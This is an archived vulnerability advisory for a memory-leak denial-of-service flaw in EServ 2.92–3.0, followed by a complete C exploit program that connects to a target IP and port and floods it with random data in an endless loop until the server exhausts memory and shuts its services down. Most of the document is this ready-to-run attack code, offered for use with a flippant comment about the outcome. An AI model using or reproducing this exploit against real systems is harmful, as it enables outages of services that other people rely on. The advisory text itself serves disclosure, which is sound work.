source: http://www.securityfocus.com/bid/7552/info
 
A denial of service vulnerability has been reported for EServ. The vulnerability exists due to the way the server handles connections. Specifically, memory allocated for open connections are not properly freed when a connection no longer exists. This will result in a consumption of all available memory resources.
 
**It has been reported that EServ version 3.0 previously thought to be invulnerable to this issue is affected by this vulnerability. This version was tested on Windows 2000.
 
This vulnerability affects EServ 2.92 to 3.0. 

/* m00-eServ-fun.c
 *
 *  EServ/2.95-3.00 remote memory-leak exploit
 *
 *  Result: exiting program and close all services
 *  if you seen message: Broken pipe
 *  then may going drink beer 8)
 *
 *  Eserv 3.0 only web(80) services susceptible on this DoS
 *
 *  rash / m00.void.ru
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{  
  char buf[2000];
  int fd;
  struct sockaddr_in rsin;

  if (argc!=3) {
   printf("\n usage: %s <ip> <port>\n\n", argv[0]);
   exit(0);  
  }
  
  rsin.sin_family = AF_INET;
  rsin.sin_port   = htons(atoi(argv[2]));
  rsin.sin_addr.s_addr = inet_addr(argv[1]);
 
  for (fd=0;fd<2000;fd++)
    buf[fd]=(int *)((rand()*10));
  
  fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);             
  if (connect(fd,(struct sockaddr *)&rsin,sizeof(struct sockaddr))) perror("[-] connect()"),exit(0);
  printf("[+] connected..\n"); 
  printf("[+] send data to host..\n"); 
  
  while (1) {
   if ((send(fd, buf, 2000, 0))<0)      
     break;  
  }   
}